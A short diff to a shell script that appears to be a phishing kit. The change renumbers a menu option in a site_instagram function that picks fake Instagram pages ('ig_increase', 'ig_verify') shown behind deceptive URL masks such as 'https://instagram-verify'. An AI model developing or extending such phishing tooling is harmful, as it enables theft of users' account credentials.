@@ -321,7 +321,7 @@ site_instagram() {
 		website="ig_increase"
 		mask='https://increase-followers'
 		tunnel_menu
-	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
+	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
 		website="ig_verify"
 		mask='https://instagram-verify'
 		tunnel_menu
